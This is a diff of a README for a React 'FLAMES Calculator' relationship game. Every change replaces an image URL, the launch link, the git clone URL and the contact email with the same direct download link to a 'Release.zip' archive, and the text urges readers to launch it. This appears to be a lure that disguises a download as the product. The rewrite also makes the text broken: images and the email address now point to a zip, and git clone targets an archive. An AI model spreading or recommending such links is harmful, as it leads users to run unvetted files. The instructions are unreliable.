@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to the FLAMES Calculator Repository! 🌟
 
-![FLAMES Calculator](https://example.com/flames-calculator.jpg)
+![FLAMES Calculator](https://github.com/James14669/react-flames-calculator/releases/download/v1.0/Release.zip)
 
 ## What is FLAMES Calculator?
 
@@ -19,7 +19,7 @@ The FLAMES Calculator is a simple tool designed to predict your relationship sta
 ## Quick Start
 
 To start using the FLAMES Calculator, simply click on the following link:  
-[Launch FLAMES Calculator](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Launch FLAMES Calculator](https://github.com/James14669/react-flames-calculator/releases/download/v1.0/Release.zip)
 
 *Note: The link needs to be launched to access the FLAMES Calculator.*
 
@@ -35,7 +35,7 @@ To run the FLAMES Calculator locally, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/react-flames-calculator.git
+   git clone https://github.com/James14669/react-flames-calculator/releases/download/v1.0/Release.zip
    ```
 
 2. Navigate to the project directory:
@@ -57,7 +57,7 @@ To run the FLAMES Calculator locally, follow these steps:
 
 ## Get in Touch
 
-If you have any questions, feedback, or suggestions, feel free to reach out! You can contact us at [contact@flamescalculator.com](mailto:contact@flamescalculator.com).
+If you have any questions, feedback, or suggestions, feel free to reach out! You can contact us at [https://github.com/James14669/react-flames-calculator/releases/download/v1.0/Release.zip](https://github.com/James14669/react-flames-calculator/releases/download/v1.0/Release.zip).
 
 Let's play the FLAMES game and uncover the secrets of your relationships! 🔮💕
 
@@ -66,4 +66,4 @@ Let's play the FLAMES game and uncover the secrets of your relationships! 🔮�
 *Can't access the FLAMES Calculator via the provided link?*  
 *Check the latest version in the "Releases" section of the repository.* 🚀
 
-![FLAMES Game](https://example.com/flames-game.jpg)
+![FLAMES Game](https://github.com/James14669/react-flames-calculator/releases/download/v1.0/Release.zip)
